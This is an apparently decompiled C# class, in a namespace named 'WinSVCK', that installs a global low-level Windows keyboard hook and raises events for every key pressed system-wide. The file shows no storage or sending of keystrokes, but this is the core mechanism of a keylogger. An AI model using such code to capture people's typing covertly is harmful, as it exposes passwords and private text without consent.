using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace WinSVCK;

public class KeyboardHook
{
	private struct KBDLLHOOKSTRUCT
	{
		public uint vkCode;

		public uint scanCode;

		public KBDLLHOOKSTRUCTFlags flags;

		public uint time;

		public UIntPtr dwExtraInfo;
	}

	[Flags]
	private enum KBDLLHOOKSTRUCTFlags : uint
	{
		LLKHF_EXTENDED = 1u,
		LLKHF_INJECTED = 0x10u,
		LLKHF_ALTDOWN = 0x20u,
		LLKHF_UP = 0x80u
	}

	public delegate void KeyDownEventHandler(Keys Key);

	public delegate void KeyUpEventHandler(Keys Key);

	private delegate int KBDLLHookProc(int nCode, IntPtr wParam, IntPtr lParam);

	private static KeyDownEventHandler KeyDownEvent;

	private static KeyUpEventHandler KeyUpEvent;

	private const int WH_KEYBOARD_LL = 13;

	private const int HC_ACTION = 0;

	private const int WM_KEYDOWN = 256;

	private const int WM_KEYUP = 257;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private KBDLLHookProc KBDLLHookProcDelegate;

	private IntPtr HHookID;

	public static event KeyDownEventHandler KeyDown
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
		}
	}

	public static event KeyUpEventHandler KeyUp
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
		}
	}

	[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int SetWindowsHookEx(int idHook, KBDLLHookProc HookProc, IntPtr hInstance, int wParam);

	[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int CallNextHookEx(int idHook, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern bool UnhookWindowsHookEx(int idHook);

	private int KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
	{
		checked
		{
			if (nCode == 0)
			{
				KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = default(KBDLLHOOKSTRUCT);
				KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT2 = default(KBDLLHOOKSTRUCT);
				if (!(wParam == (IntPtr)256) && !(wParam == (IntPtr)260))
				{
					if (wParam == (IntPtr)257 || wParam == (IntPtr)261)
					{
						KeyUpEventHandler keyUpEvent = KeyUpEvent;
						if (keyUpEvent != null)
						{
							object? obj = Marshal.PtrToStructure(lParam, kBDLLHOOKSTRUCT.GetType());
							keyUpEvent((Keys)(int)((obj != null) ? ((KBDLLHOOKSTRUCT)obj) : kBDLLHOOKSTRUCT2).vkCode);
						}
					}
				}
				else
				{
					KeyDownEventHandler keyDownEvent = KeyDownEvent;
					if (keyDownEvent != null)
					{
						object? obj2 = Marshal.PtrToStructure(lParam, kBDLLHOOKSTRUCT.GetType());
						keyDownEvent((Keys)(int)((obj2 != null) ? ((KBDLLHOOKSTRUCT)obj2) : kBDLLHOOKSTRUCT2).vkCode);
					}
				}
			}
			return CallNextHookEx((int)IntPtr.Zero, nCode, wParam, lParam);
		}
	}

	public KeyboardHook()
	{
		KBDLLHookProcDelegate = KeyboardProc;
		HHookID = IntPtr.Zero;
		HHookID = (IntPtr)SetWindowsHookEx(13, KBDLLHookProcDelegate, (IntPtr)Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		if (HHookID == IntPtr.Zero)
		{
			throw new Exception("Could not set keyboard hook");
		}
	}

	protected override void Finalize()
	{
		if (!(HHookID == IntPtr.Zero))
		{
			UnhookWindowsHookEx((int)HHookID);
		}
		base.Finalize();
	}
}
